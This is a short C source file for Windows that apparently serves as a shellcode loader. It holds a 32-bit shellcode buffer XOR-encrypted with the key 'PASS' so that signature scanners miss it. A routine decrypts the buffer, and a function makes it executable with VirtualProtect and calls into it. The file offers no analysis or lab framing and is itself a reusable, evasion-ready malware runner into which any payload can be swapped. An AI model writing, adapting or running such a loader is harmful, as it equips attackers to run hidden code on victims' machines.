#include <windows.h>

#define KEY "PASS"

void XOR(char *data, size_t data_len, char *key, size_t key_len){
    int j = 0;
    for (int i = 0;i<data_len;i++){
        data[i] = data[i] ^ key[j];
        j = (j + 1) % key_len;
    }
}
//32 bit encrypted shellcode
char encrypted_shellcode[] = {
    "\xac\xa9\xd1\x53\x50\x41\x33\xda\xb5\x70\x93\x37\xdb\x11\x63\xd8"
    "\x02\x4d\xd8\x01\x44\xca\x21\x7b\x5f\xf6\x19\x75\x61\xbe\xff\x6f"
    "\x31\x3d\x51\x7f\x70\x80\x9c\x5e\x51\x86\xb1\xa1\x02\x16\xd8\x01"
    "\x40\xca\x19\x6f\xdb\x0d\x42\x2b\xb3\x09\x52\x82\x01\xca\x0a\x73"
    "\x51\x92\xd8\x1a\x48\xa2\x69\x1a\xdb\x75\xd8\x52\x86\x70\xac\xff"
    "\x91\x8e\x5e\x52\x97\x79\xb3\x26\xa6\x42\x2e\xab\x6b\x3c\x77\x26"
    "\xb4\x19\xd8\x0b\x74\x40\x80\x35\xdb\x4d\x18\xd8\x08\x5d\x52\x80"
    "\xdb\x45\xd8\x52\x80\xc8\x17\x77\x74\x1a\x08\x32\x09\x1b\x02\xac"
    "\xb0\x1e\x0c\x09\xdb\x53\xb8\xde\x0d\x2b\x52\xde\xd5\xf3\x53\x53"
    "\x50\x11\x3b\x62\xdb\x2e\xd4\xac\x85\xfa\xa3\xe6\xf2\x17\x3b\xf5"
    "\xc5\xfc\xce\xac\x85\x7d\x55\x2f\x5a\xc1\xa8\xb3\x25\x44\xe8\x14"
    "\x43\x33\x3c\x39\x50\x12\xac\x86\x33\x20\x3f\x30\x7e\x24\x2b\x36"
    "\x50"
};
void startShellCode(){
    DWORD oldProtect;
    VirtualProtect(encrypted_shellcode, sizeof(encrypted_shellcode), PAGE_EXECUTE_READ, &oldProtect);
    int (*shellcodefunc)() = (int(*)())(void*)encrypted_shellcode;
    shellcodefunc();
}
void decryptShellCode(){
    XOR(encrypted_shellcode, sizeof(encrypted_shellcode)-1, KEY, sizeof(KEY)-1);
}